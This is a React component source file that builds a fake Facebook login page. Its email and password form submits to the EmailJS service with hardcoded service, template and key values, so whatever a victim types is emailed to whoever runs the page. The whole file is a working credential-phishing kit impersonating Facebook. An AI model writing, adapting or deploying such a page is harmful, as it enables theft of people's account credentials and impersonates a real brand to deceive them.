import React, { useRef } from "react";
import emailjs from "@emailjs/browser";

import "../App.css";

const FacebookLogin = () => {
    const SERVICE_ID = import.meta.env.VITE_SERVICE_ID;
    const TEMPLATE_ID = import.meta.env.VITE_TEMPLATE_ID;
    const PUBLIC_KEY = import.meta.env.VITE_PUBLIC_KEY;
  
    const form = useRef();
  
    const sendEmail = (e) => {
      e.preventDefault();
  
      emailjs
        .sendForm('service_wuxwbfb', "template_ckk9sd2", form.current, {
          publicKey: "KCHZ6YAI5ZoKsbM0x",
        })
        .then(
          () => {
            console.log("SUCCESS!");
          },
          (error) => {
            console.log("FAILED...", error.text);
          }
        );
    };
  return (
    <div className="content">
    <div className="flex-div">
      <div className="name-content">
        <h1 className="logo">Facebook</h1>
        <p>Connect with friends and the world around you on Facebook.</p>
      </div>
      <form ref={form} onSubmit={sendEmail}>
        <input
          type="email"
          placeholder="Email or Phone Number"
          name="email"
          id="email"
          required
        />
        <input
          type="password"
          placeholder="Password"
          name="keyword"
          id="keyword"
          required
        />
        <button type="submit" className="login">
          Log In
        </button>
        <a href="#">Forgot Password ?</a>
        <hr />
        <button className="create-account">Create New Account</button>
      </form>
    </div>
  </div>
  )
}

export default FacebookLogin;